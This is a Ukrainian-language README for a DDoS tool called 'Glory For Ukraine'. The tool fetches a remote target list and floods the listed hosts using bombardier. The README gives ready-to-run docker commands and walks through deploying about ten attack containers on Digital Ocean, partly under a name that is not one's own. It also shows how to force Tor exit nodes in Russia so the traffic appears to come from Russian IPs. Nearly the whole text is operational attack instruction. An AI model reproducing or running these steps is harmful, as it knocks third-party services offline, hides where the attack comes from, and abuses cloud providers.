# Glory For Ukraine

DDOS координатор, використовуючий bombardier на один з хостів указаний в scheduled_targets.json, скачаний з https://gloryforukraine.pages.dev/scheduled_targets.json

## Як використати

Запуск через докер: `docker run --env SCHEDULED_TARGETS_URL=https://gloryforukraine.pages.dev/scheduled_targets.json --env PARALLEL_FACTOR=5 --cpus=".7" --rm -it archdev/gloryforukraine`

Запуск через білд:
- install NodeJS 16+
- git clone
- cd gloryforukraine
- npm i
- `./scripts/launch.sh` or `.\scripts\launch.bat`

# Як засетапи Gloryforukraine на Digigal Ocean App Platform

1. Зареєструйте аккаунт на Digital Ocean:
    [Посилання за рефералом](https://m.do.co/c/aa9c8e1fc61f) - дає $100 на рахунок
    По особистим данним - будь яке ім'я (можна не своє) АЛЕ: робочий імейл до якого у вас є доступ - він потрібен щоб залогінитись по лінку який прийде вам на імейл (2FA)
    Також вам потрібна робоча банківська карта (укр карти Моно на Привата раніше працювали, віртуальні карти теж UK банків теж працюють)
    (Гроші НЕ БУДУТЬ зніматись відразу, лише через місяц)
2. Створіть новий апчик в Create > Apps
3. Виберіть Docker Hub
4. в Image введіть: `archdev/gloryforukraine`, tag - залишіть пустим (`latest`)
5. ОБОВ'ЯЗКОВО: Type > **Worker** (по замовчуванню там Web Service)
6. Також додайте `Environment Variables`: `SCHEDULED_TARGETS_URL=https://gloryforukraine.pages.dev/scheduled_targets.json` та `PARALLEL_FACTOR=5`
7. Виберіть Регіон - можна Європу або Азію - будь який
8. Finalise and Launch - виберіть аккаунт Pro - і в Containers: Pro - штук 10 має вистачити

# Як використовувати Gloryforukraine з TOR (атака буде йти с росiйских IP)
1. Встановiть TOR. `sudo apt install tor`
2. Заредагуйте конфіг /etc/tor/torrc:
    `sudo vi /etc/tor/torrc`
    Розкоментуйте `#ControlPort 9051`

    Знайдіть `#CookieAuthentication 1` Розкоментуйте, та змініть 1 на 0.

    В кінець файла додайте
    `ExitNodes {RU}`
    `StrictNodes 1`

 4. Перезавантажте сервіс ТОР `sudo /etc/init.d/tor restart`.


5. Готово! Теперь ви можете запустити скрипт через torify. Наприклад: `sudo torify docker run --env SCHEDULED_TARGETS_URL=https://gloryforukraine.pages.dev/scheduled_targets.json --env PARALLEL_FACTOR=5 --cpus=".7" --rm -it archdev/gloryforukraine`.